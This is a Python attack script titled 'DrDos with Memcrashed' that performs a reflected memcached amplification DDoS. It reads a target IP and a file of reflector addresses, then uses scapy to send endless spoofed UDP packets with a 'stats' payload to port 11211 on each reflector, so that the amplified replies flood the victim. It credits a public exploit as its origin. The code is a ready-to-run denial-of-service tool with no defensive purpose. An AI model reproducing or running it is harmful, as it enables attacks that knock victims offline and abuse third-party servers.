from scapy.all import IP, UDP, Raw, send
import random
import time
title=[''' 
 ____       ____                       _ _   _     
|  _ \ _ __|  _ \  ___  ___  __      _(_) |_| |__  
| | | | '__| | | |/ _ \/ __| \ \ /\ / / | __| '_ \ 
| |_| | |  | |_| | (_) \__ \  \ V  V /| | |_| | | |
|____/|_|  |____/ \___/|___/   \_/\_/ |_|\__|_| |_|
                                                   
 __  __                                   _              _ 
|  \/  | ___ _ __ ___   ___ _ __ __ _ ___| |__   ___  __| |
| |\/| |/ _ \ '_ ` _ \ / __| '__/ _` / __| '_ \ / _ \/ _` |
| |  | |  __/ | | | | | (__| | | (_| \__ \ | | |  __/ (_| |
|_|  |_|\___|_| |_| |_|\___|_|  \__,_|___/_| |_|\___|\__,_|
''','''
 ▄▄▄▄▄               ▄▄▄▄▄                                 
 ██▀▀▀██             ██▀▀▀██                                
 ██    ██   ██▄████  ██    ██   ▄████▄   ▄▄█████▄          
 ██    ██   ██▀      ██    ██  ██▀  ▀██  ██▄▄▄▄ ▀             
 ██    ██   ██       ██    ██  ██    ██   ▀▀▀▀██▄         
 ██▄▄▄██    ██       ██▄▄▄██   ▀██▄▄██▀  █▄▄▄▄▄██            
 ▀▀▀▀▀      ▀▀       ▀▀▀▀▀       ▀▀▀▀     ▀▀▀▀▀▀             
                                                                                
              ██               ▄▄       
              ▀▀       ██      ██       
██      ██  ████     ███████   ██▄████▄ 
▀█  ██  █▀    ██       ██      ██▀   ██ 
 ██▄██▄██     ██       ██      ██    ██ 
 ▀██  ██▀  ▄▄▄██▄▄▄    ██▄▄▄   ██    ██ 
  ▀▀  ▀▀   ▀▀▀▀▀▀▀▀     ▀▀▀▀   ▀▀    ▀▀ 
                                                                                
 ▄▄▄  ▄▄▄                                                    ▄▄                 
 ███  ███                                                    ██                 
 ████████   ▄████▄   ████▄██▄   ▄█████▄   ▄█████▄   ▄█████▄  ██▄████▄   ▄████▄  
 ██ ██ ██  ██▄▄▄▄██  ██ ██ ██  ██▀    ▀   ▀ ▄▄▄██  ██▀    ▀  ██▀   ██  ██▄▄▄▄██ 
 ██ ▀▀ ██  ██▀▀▀▀▀▀  ██ ██ ██  ██        ▄██▀▀▀██  ██        ██    ██  ██▀▀▀▀▀▀ 
 ██    ██  ▀██▄▄▄▄█  ██ ██ ██  ▀██▄▄▄▄█  ██▄▄▄███  ▀██▄▄▄▄█  ██    ██  ▀██▄▄▄▄█ 
 ▀▀    ▀▀    ▀▀▀▀▀   ▀▀ ▀▀ ▀▀    ▀▀▀▀▀    ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀▀  
''',''' 
                                   
 mmmm          mmmm                
 #   "m  m mm  #   "m  mmm    mmm  
 #    #  #"  " #    # #" "#  #   " 
 #    #  #     #    # #   #   """m 
 #mmm"   #     #mmm"  "#m#"  "mmm" 

          "      m    #     
m     m mmm    mm#mm  # mm  
"m m m"   #      #    #"  # 
 #m#m#    #      #    #   # 
  # #   mm#mm    "mm  #   # 

 m    m                                    #                 # 
 ##  ##  mmm   mmmmm   mmm    mmm    mmm   # mm    mmm    mmm# 
 # ## # #"  #  # # #  #"  "  "   #  #"  "  #"  #  #"  #  #" "# 
 # "" # #""""  # # #  #      m"""#  #      #   #  #""""  #   # 
 #    # "#mm"  # # #  "#mm"  "mm"#  "#mm"  #   #  "#mm"  "#m## 
'''
]                                                                               
       

#chose one way to input your ip target
#if you want to use ddos.sh chose the third one
target = input(print("Input IP target:"))
#target = input()
#target = "0.0.0.0"
with open('ips.txt', 'r') as f:
        ips = f.readlines()
print(random.choice(title))#print the random cool title
print("Start Attacking")
def waiting(cycle=50, delay=0.1):
	"""旋转式进度指示""" 
	for i in range(cycle): 
		for ch in ['--', '\\', '|', '/']: 
			print('\b%s'%ch, end='', flush=True) 
			time.sleep(delay)
waiting()


payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
while True:
    for ip in ips:
        send(IP(src=target, dst=ip) / UDP(dport=11211) / Raw(load=payload), count=100, verbose=0)
print("attack finished")




# original using Shodan API:
# https://github.com/649/Memcrashed-DDoS-Exploit/blob/master/Memcrashed.py
